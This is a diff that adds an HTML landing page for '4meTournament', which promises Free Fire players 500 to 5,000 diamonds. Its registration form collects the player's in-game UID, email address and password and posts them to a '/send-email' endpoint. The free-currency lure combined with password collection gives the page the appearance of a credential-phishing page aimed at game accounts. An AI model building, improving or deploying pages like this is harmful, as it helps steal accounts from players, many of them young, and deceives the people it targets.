@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style.css" />
+    <title>4meTournament - Home</title>
+  </head>
+  <body>
+    <nav
+      class="navbar border-bottom border-body navbar-expand-lg py-3"
+      data-bs-theme="dark"
+      style="background-color: #0f0f0f"
+    >
+      <div class="container flex justify-betwenn">
+        <a class="navbar-brand" href="#">4meTournament</a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="navbar-collapse inline" id="navbarSupportedContent">
+          <ul class="flex gap-24 navbar-nav me-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="#">Home</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#register">Register</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#pricing" aria-disabled="true"
+                >Pricing</a
+              >
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="about.html" aria-disabled="true"
+                >About Us</a
+              >
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+    <div class="hero-section py-5">
+      <div class="container">
+        <h1>Win 500 to 5000 Diamond</h1>
+        <p class="mt-4">
+          <i
+            >For only winning a single tournament.<br />obtain the ability to
+            join more of our diamond tournament</i
+          >
+        </p>
+        <h6 class="mb-4">
+          Join our exciting Free Fire tournaments and win between 500 to 5,000
+          diamonds! Simply register for a chance to compete and showcase your
+          skills. Whether you're a seasoned player or just starting out, our
+          tournaments offer great rewards for top performers. Don't miss out on
+          the opportunity to enhance your Free Fire experience with these
+          exclusive prizes. Register now and start winning diamonds! 4o
+        </h6>
+        <button class="btn btn-primary">Register A Tournament Now</button>
+      </div>
+    </div>
+    <div class="container py-5" id="pricing">
+      <h4 class="mb-3">Pricing</h4>
+      <ul class="list-group">
+        <li class="list-group-item active flex justify-between">
+          <p>1st Price</p>
+          <div class="details">
+            <img
+              src="https://th.bing.com/th/id/R.a88debcfc6a9df975bfe77c9c1208f13?rik=O5aNOFEbYtBIXA&pid=ImgRaw&r=0"
+              width="20"
+              alt=""
+            />
+            2000
+          </div>
+        </li>
+        <li class="list-group-item flex justify-between">
+          <p>2nd Price</p>
+          <div class="details">
+            <img
+              src="https://th.bing.com/th/id/R.a88debcfc6a9df975bfe77c9c1208f13?rik=O5aNOFEbYtBIXA&pid=ImgRaw&r=0"
+              width="20"
+              alt=""
+            />
+            1000
+          </div>
+        </li>
+        <li class="list-group-item flex justify-between">
+          <p>3rd Price</p>
+          <div class="details">
+            <img
+              src="https://th.bing.com/th/id/R.a88debcfc6a9df975bfe77c9c1208f13?rik=O5aNOFEbYtBIXA&pid=ImgRaw&r=0"
+              width="20"
+              alt=""
+            />
+            500
+          </div>
+        </li>
+      </ul>
+    </div>
+    <form
+      id="register"
+      action="/send-email"
+      enctype="application/x-www-form-urlencoded"
+      method="POST"
+      class="container pb-5"
+    >
+      <div class="mb-3">
+        <label for="exampleFormControlInput1" class="form-label">UID</label>
+        <input
+          type="number"
+          id="number"
+          required
+          name="number"
+          class="form-control"
+          id="exampleFormControlInput1"
+          placeholder="Your in game UID"
+        />
+      </div>
+      <div class="mb-3">
+        <label for="exampleFormControlInput1" class="form-label"
+          >Email address</label
+        >
+        <input
+          type="email"
+          id="email"
+          required
+          name="email"
+          class="form-control"
+          id="exampleFormControlInput1"
+          placeholder="Your email address"
+        />
+      </div>
+      <div class="mb-3">
+        <label for="exampleFormControlTextarea1" class="form-label"
+          >Password</label
+        >
+        <input
+          type="password"
+          id="password"
+          name="password"
+          required
+          class="form-control"
+          id="exampleFormControlInput1"
+          placeholder="Your password"
+        />
+      </div>
+      <div class="mb-3">
+        <label for="exampleFormControlTextarea1" class="form-label"
+          >Reason</label
+        >
+        <textarea
+          name="reason"
+          id="reason"
+          required
+          class="form-control"
+          id="exampleFormControlTextarea1"
+          rows="3"
+          placeholder="Reason to join our tournament"
+        ></textarea>
+      </div>
+
+      <button type="submit" class="btn btn-success">Register</button>
+    </form>
+    <footer
+      class="bg-body-tertiary text-center text-lg-start"
+      data-bs-theme="dark"
+    >
+      <div class="text-center p-3" style="background-color: #0f0f0f">
+        <span class="text-white">© 2020 Copyright:</span>
+        <a class="text-body" href="/">4metournament.com</a>
+      </div>
+    </footer>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
